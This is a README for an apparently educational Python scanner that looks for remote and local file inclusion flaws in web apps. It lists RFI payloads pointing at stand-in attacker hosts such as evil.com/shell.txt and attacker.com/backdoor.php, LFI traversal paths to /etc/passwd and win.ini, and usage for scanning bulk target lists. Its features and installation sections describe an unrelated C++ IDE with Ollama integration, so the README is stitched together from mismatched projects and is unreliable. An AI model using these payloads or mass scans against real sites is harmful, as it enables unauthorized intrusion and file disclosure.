# Modern RFI/LFI Scanner

A modernized, educational security tool for detecting Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities in web applications.

## ⚠️ IMPORTANT WARNING

**This tool is for EDUCATIONAL PURPOSES ONLY. It should only be used on systems you own or have explicit written permission to test. Unauthorized scanning of systems is illegal in many jurisdictions and may result in criminal charges.**

## Features

- **Modern C++ IDE**: Windows-based IDE with project management and code editing capabilities
- **Multiple Build Systems**: Support for Visual Studio (MSBuild) and MSYS2 (GCC)
- **Integrated Development Environment**: Solution explorer, tabbed editor, and status bar
- **Project Configuration**: Configurable compiler settings, themes, and build options
- **Layout Management**: Customizable window layouts and editor arrangements
- **Reports Viewer**: Integrated build output and error reporting
- **Configuration Management**: Persistent settings with INI-based configuration
- **Ollama Integration**: AI-powered code analysis and assistance (NEW!)

## Installation

### C++ IDE Setup

1. **Clone or download the repository**
2. **Open in Visual Studio**:
   - Open `IDEProject.sln` in Visual Studio 2019 or later
   - Ensure Windows SDK 10.0.19041.0 or later is installed
   - Build the solution (F7)

### Ollama Integration Setup

1. **Install Ollama**:
   - Download from [https://ollama.ai](https://ollama.ai)
   - Follow installation instructions for your platform
   
2. **Pull a model**:
   ```bash
   ollama pull llama2
   # or any other compatible model
   ```

3. **Configure the IDE**:
   - Copy `IDEConfig.ini.example` to `IDEConfig.ini`
   - Set `ollamaEnabled=1`
   - Adjust `ollamaHost`, `ollamaModel`, and `ollamaTimeout` as needed

### Python Tools (Optional)

For the legacy Python tools, install dependencies:
```bash
pip install -r requirements.txt
```

## Usage

### C++ IDE Usage

1. **Start the IDE**:
   - Run the compiled executable
   - The IDE will open with a solution explorer, editor area, and status bar

2. **Ollama Features** (available in Ollama menu):
   - **Test Connection**: Verify Ollama is running and accessible
   - **Settings**: View current Ollama configuration
   - **Analyze Code**: Get AI analysis of the current code in the editor
   - **Suggest Improvements**: Get AI suggestions for code improvements
   - **Explain Error**: Get AI help explaining compilation errors
   - **Generate Documentation**: Generate documentation for the current code

### Python Tools Usage (Legacy)

```bash
# Scan a single URL for RFI vulnerabilities
python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type rfi

# Scan a single URL for LFI vulnerabilities
python modern_rfi_scanner.py --url "http://example.com/page.php?file=" --type lfi

# Scan multiple targets from a file
python modern_rfi_scanner.py --targets targets.txt --type rfi
```

### Advanced Usage

```bash
# Scan with custom settings
python modern_rfi_scanner.py \
    --targets targets.txt \
    --type rfi \
    --concurrent 20 \
    --timeout 15 \
    --output results.json \
    --verbose
```

### Command Line Options

- `--targets FILE`: File containing target URLs (one per line)
- `--url URL`: Single target URL to scan
- `--type {rfi,lfi}`: Type of vulnerability to scan for (default: rfi)
- `--concurrent N`: Maximum concurrent connections (default: 10)
- `--timeout N`: Request timeout in seconds (default: 10)
- `--output FILE`: Output file for results (default: scan_results.json)
- `--verbose, -v`: Enable verbose output
- `--help, -h`: Show help message

## Input File Format

Create a text file with target URLs, one per line:

```
http://example1.com/page.php?id=
http://example2.com/index.php?page=
http://example3.com/view.php?file=
```

## Output

The scanner generates two types of output:

1. **JSON Report** (`scan_results.json`): Machine-readable format with detailed scan results
2. **Console Output**: Human-readable summary and vulnerable targets

### Sample JSON Output

```json
{
  "scan_summary": {
    "total_scanned": 50,
    "vulnerable_found": 3,
    "scan_type": "RFI/LFI",
    "timestamp": "2024-01-15 14:30:25"
  },
  "vulnerable_targets": [
    {
      "url": "http://example.com/page.php?id=http://evil.com/shell.txt?",
      "payload": "http://evil.com/shell.txt?",
      "response_code": 200,
      "response_preview": "root:x:0:0:root:/root:/bin/bash...",
      "scan_time": 1.23
    }
  ]
}
```

## Security Considerations

### For Users
- Only scan systems you own or have explicit permission to test
- Be aware of local laws regarding security testing
- Use responsibly and ethically
- Consider the impact on target systems

### For System Administrators
- Implement proper input validation
- Use allowlists for file inclusion
- Enable security headers
- Regular security audits
- Monitor for suspicious activity

## Technical Details

### RFI Detection
The scanner tests for RFI vulnerabilities by:
1. Injecting remote URLs as parameters
2. Checking responses for common indicators
3. Analyzing response patterns and content

### LFI Detection
The scanner tests for LFI vulnerabilities by:
1. Injecting path traversal sequences
2. Attempting to access system files
3. Checking for sensitive file content in responses

### Payloads Used

**RFI Payloads:**
- `http://evil.com/shell.txt?`
- `http://attacker.com/backdoor.php?`
- `http://malicious.com/exploit.txt?`

**LFI Payloads:**
- `/../../../../../../../../etc/passwd`
- `/../../../../../../../../windows/win.ini`
- `/../../../../../../../../etc/hosts`

## Comparison with Original Script

| Feature | Original Perl Script | Modern Python Script |
|---------|---------------------|---------------------|
| Language | Perl | Python 3.8+ |
| Concurrency | Basic forking | Async/await |
| Error Handling | Limited | Comprehensive |
| Reporting | IRC messages | JSON + text reports |
| User Agents | Static list | Rotating system |
| Rate Limiting | None | Built-in |
| Code Quality | Monolithic | Modular OOP |
| Documentation | Minimal | Comprehensive |

## Legal and Ethical Use

This tool is provided for educational and authorized security testing purposes only. Users are responsible for:

1. Ensuring they have permission to test target systems
2. Complying with local laws and regulations
3. Using the tool responsibly and ethically
4. Not causing harm or disruption to systems

## Contributing

If you want to contribute to this project:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is for educational use only. Please ensure you have proper authorization before using this tool on any systems.

## Disclaimer

The authors and contributors are not responsible for any misuse of this tool. Users are solely responsible for ensuring they have proper authorization and comply with applicable laws when using this software.
